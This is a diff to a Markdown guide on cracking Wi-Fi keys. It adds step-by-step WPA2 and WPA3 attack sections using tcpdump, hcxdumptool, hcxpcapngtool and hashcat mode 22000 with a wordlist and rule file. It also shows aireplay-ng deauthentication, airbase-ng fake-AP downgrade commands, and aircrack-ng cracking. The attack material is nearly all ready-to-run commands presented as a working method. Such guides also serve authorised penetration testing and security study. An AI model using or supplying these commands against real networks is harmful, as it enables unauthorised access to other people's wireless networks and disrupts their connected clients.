@@ -78,14 +78,14 @@ This will generate a lot of traffic and help you capture more packets.
 Once you have captured enough packets (at least 50000 IVs, recommended 200000), you can crack the WEP key using the following command:
 
 ```bash
-sudo aircrack-ng <output_file>
+aircrack-ng <output_file>
 ```
 
 This will attempt to crack the WEP key using the captured packets. If successful, it will display the WEP key in the terminal.
 
 ## WPA/WPA2 cracking
 
-### Capture the handshake
+### Option 1 (easier but slower and less successful)
 
 To crack WPA/WPA2, you need to capture a 4-way handshake. To do so, you have to capture the handshake when a client connects to the network, so start the airodump-ng command to capture packets:
 
@@ -99,16 +99,50 @@ If a client is connected to the network, you will see the handshake in the termi
 sudo aireplay-ng --deauth 10 -a <BSSID> -c <STATION> <monitor_interface>
 ```
 
-### Cracking the WPA/WPA2 key
-
 Once you have captured the handshake, you can crack the WPA/WPA2 key using a wordlist. You can use the following command to crack the key:
 
 ```bash
-sudo aircrack-ng -w <wordlist> <capture_file>
+aircrack-ng -w <wordlist> <capture_file>
 ```
 
 This will attempt to crack the WPA/WPA2 key using the wordlist provided. If successful, it will display the WPA/WPA2 key in the terminal.
 Note that if the ESSID is hidden, you will need to use the `-e` option to specify the ESSID when cracking the key.
+
+### Option 2 (harder but faster and more successful)
+
+A way faster and more successful alternative to the previous method is to use `hcxdumptool` to capture the handshake or the PMKID and then crack it with `hashcat`. This makes it more likely to succeed than the previous method since we could only use the handshake with it, and this method allows us to use `hashcat` to crack the hash which is way faster than `aircrack-ng`.
+
+First, we need to do a dump using `tcpdump` :
+
+```bash
+sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <BSSID (eg.aabbccddeeff)> or wlan addr3 ffffffffffff" -ddd > <bpf_output_file>.bpf
+```
+
+Then, we can use `hcxdumptool` to capture the handshake or the PMKID, and it is mandatory to add band information to the channel number (e.g. 12a):
+
+- band a: NL80211_BAND_2GHZ
+- band b: NL80211_BAND_5GHZ
+- band c: NL80211_BAND_6GHZ
+
+Thus, you can use the following command:
+
+```bash
+sudo hcxdumptool -i <monitor_interface> -c <channel>[a,b,c] --bpf=<bpf_input_file>.bpf -w <output_capture_file>.pcapng
+```
+
+This will create a pcapng file with the captured packets, you need to wait for either the EAPOL handshake symbolized by the '3' or the PMKID symbolized by the 'P' to have a + under them to know that you have captured one of them, allowing you to try to crack the hash.
+
+Now, we need to convert the pcapng file to the specific hash that `hashcat` can use. To do this, we can use the following command:
+
+```bash
+hcxpcapngtool -o <output_file>.hc22000 <input_capture_file>.pcapng
+```
+
+Finally, we can use `hashcat` to crack the hash. You can use the following command to try to crack the hash using a wordlist and a rule file, but bruteforce is also possible for wireless cracking.
+
+```bash
+hashcat -m 22000 -a 0 -o <output_file> -r /tmp/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule <hash_file>.hc22000 /tmp/wordlists/passwords/most_used_passwords.txt -w 4 --opencl-device-types 1,2 
+```
 
 ## WPA3 downgrade
 
@@ -140,7 +174,7 @@ sudo airbase-ng -e <SSID> -c <channel> -P -C 30 -Z 4 <monitor_interface>
 
 This will create a fake AP with the specified SSID and channel, however, this is not a true WPA2 AP, which does not allow us to capture the handshake. To do this, we need to use a different method. This is the only thing missing to make WPA3 cracking work.
 
-### Capture the handshake
+### Option 1 (easier but slower and less successful)
 
 Conceal the WPA3 handshake by capturing it with airodump-ng:
 
@@ -151,10 +185,30 @@ sudo airodump-ng --channel <channel> --bssid <fake_BSSID> --write <output_file> 
 Once you have captured the handshake, you can crack the WPA3 key using a wordlist. You can use the following command to crack the key:
 
 ```bash
-sudo aircrack-ng -w <wordlist> <capture_file>
+aircrack-ng -w <wordlist> <capture_file>
 ```
 
 This will attempt to crack the WPA3 key using the wordlist provided. If successful, it will display the WPA3 key in the terminal.
+
+### Option 2 (harder but faster and more successful)
+
+Same as WPA2, if you need more explanation check this [part](#option-2-harder-but-faster-and-more-successful) of the WPA2 cracking section.
+
+```bash
+sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <fake_BSSID (eg.aabbccddeeff)> or wlan addr3 ffffffffffff" -ddd > <bpf_output_file>.bpf
+```
+
+```bash
+sudo hcxdumptool -i <monitor_interface> -c <channel>[a,b,c] --bpf=<bpf_input_file>.bpf -w <output_capture_file>.pcapng
+```
+
+```bash
+hcxpcapngtool -o <output_file>.hc22000 <input_capture_file>.pcapng
+```
+
+```bash
+hashcat -m 22000 -a 0 -o <output_file> -r /tmp/OneRuleToRuleThemStill/OneRuleToRuleThemStill.rule <hash_file>.hc22000 /tmp/wordlists/passwords/most_used_passwords.txt -w 4 --opencl-device-types 1,2 
+```
 
 ## Resetting the interface
 
@@ -172,3 +226,4 @@ sudo systemctl restart NetworkManager
 ```
 
 This will restart the network manager and allow you to connect to wifi networks again.
+If you are using a different network manager, rebooting your system should also work.
